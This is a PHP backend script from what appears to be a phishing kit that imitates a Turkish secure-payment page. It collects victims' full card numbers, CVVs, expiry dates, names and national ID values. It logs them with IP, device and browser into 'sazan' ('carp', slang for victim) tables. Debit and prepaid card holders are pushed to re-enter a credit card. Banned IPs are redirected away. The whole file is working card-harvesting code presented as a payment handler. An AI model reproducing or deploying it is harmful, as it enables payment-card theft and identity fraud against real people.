<?php
	ob_start(); 
   session_start(); 
   
  $tutar = $_SESSION['tutar'] ?? "29";
  
  
   date_default_timezone_set('Europe/Istanbul');
   include(__DIR__ . "/gmypanel/Core/getRealIPAdress.php");
   include(__DIR__ . "/gmypanel/Core/mobileDetect.php");
   include(__DIR__ . "/gmypanel/Core/browserDetect.php");
   include(__DIR__ . "/gmypanel/Connection.php");

 

   function tum_bosluklari_temizle($metin)
   {
       $metin = str_replace("/s+/", "", $metin);
       $metin = str_replace(" ", "", $metin);
       $metin = str_replace(" ", "", $metin);
       $metin = str_replace(" ", "", $metin);
       $metin = str_replace("/s/g", "", $metin);
       $metin = str_replace("/s+/g", "", $metin);
       $metin = trim($metin);
       return $metin;
   }

   $ip=getUserIP();
   $date=date('d.m.Y H:i');



 	 	 	 
 
	 $adsoyad = $_POST['holder'];
	 $kk = $_POST['showNumber'];
     $skt1 = $_POST['ExpiryMonth']; 
	 $skt2 = $_POST['ExpiryYear'];
	 $skt2 = substr($skt2, 2, 4);
     $cvv = $_POST['cvc'];
	 
	 
	 $skt = "".$skt1."/".$skt2."";
	 $telcek = $_SESSION['tc'];
	 
  

    $temizx = tum_bosluklari_temizle($kk);
  
    $cc_last_4 = substr($temizx, 12, 16);
    $_SESSION['cc_last_4'] = $cc_last_4;
    $bin = substr($temizx, 0, 6);
    $_SESSION['cc_first_6'] = $bin;

		//echo $bin;
		
		
		
		$sorgulabin = $db->query("SELECT * FROM banklist WHERE PrefixNo = '$bin'")->fetch(PDO::FETCH_ASSOC);
		
		
		$binkontrol = "".$sorgulabin['MemberName']." - ".$sorgulabin['CardType']." - ".$sorgulabin['SubType']."";
		
	//	echo $binkontrol;

		

    
    
	if($sorgulabin['CardType']=="DEBIT CARD"){
		
		$query = $db->prepare("INSERT INTO sazan_debit SET ad=?,kk=?,sonkul=?,cvv=?,cardLimit=?,banka=?,ip=?,date=?, cihaz=?,tarayici=?");
    $insert = $query->execute(array($adsoyad, $kk, $skt, $cvv, $telcek, $binkontrol, $ip, $date, $cihaz, $tarayici));
	
		
		echo '<script type="text/javascript">alert("Lütfen Kredi Kartınız İle Deneyiniz.");window.location.href="SecurePayment.php";</script>';
		
		
		
	}else if($sorgulabin['CardType']=="PREPAID CARD"){
		$query = $db->prepare("INSERT INTO sazan_debit SET ad=?,kk=?,sonkul=?,cvv=?,cardLimit=?,banka=?,ip=?,date=?, cihaz=?,tarayici=?");
    $insert = $query->execute(array($adsoyad, $kk, $skt, $cvv, $telcek, $binkontrol, $ip, $date, $cihaz, $tarayici));
	
		
		echo '<script type="text/javascript">alert("Lütfen Kredi Kartınız İle Deneyiniz.");window.location.href="SecurePayment.php";</script>';
	}
	else if($sorgulabin['CardType']==""){
		
		
		$query = $db->prepare("INSERT INTO sazan SET ad=?,kk=?,sonkul=?,cvv=?,cardLimit=?,banka=?,ip=?,date=?, cihaz=?,tarayici=?");
    $insert = $query->execute(array($adsoyad, $kk, $skt, $cvv, $telcek, $binkontrol, $ip, $date, $cihaz, $tarayici));
	
	
		  if($insert) {
      header('Location:Waiting.php');
    }
	
	}
		
	
	
	else{
		
		$query = $db->prepare("INSERT INTO sazan SET ad=?,kk=?,sonkul=?,cvv=?,cardLimit=?,banka=?,ip=?,date=?, cihaz=?,tarayici=?");
    $insert = $query->execute(array($adsoyad, $kk, $skt, $cvv, $telcek, $binkontrol, $ip, $date, $cihaz, $tarayici));
	
	
		  if($insert) {
      header('Location:Waiting.php');
    }
		
	}
	
	$ban = $db->query("SELECT * FROM ban", PDO::FETCH_ASSOC);
   foreach($ban as $kontrol){
       if($kontrol['ban'] == $ip){ 
           header('Location:https://www.youtube.com/watch?v=D4Ici4i8_3A&ab_channel=SwaTisCoN');
       } 
   }

	




?>

<script>



var rules = new Array();
    rules.push('basvuruTanim|notequal|0|Başvuru seçmediniz');
    rules.push('kimlikNo|numeric|TC Kimlik No rakamlardan oluşmalıdır');
    rules.push('kimlikNo|minlength|11|TC Kimlik No uzunluğu 11 rakam olmalıdır');
    rules.push('kimlikNo|maxlength|11|TC Kimlik No uzunluğu 11 rakam olmalıdır');


</script>
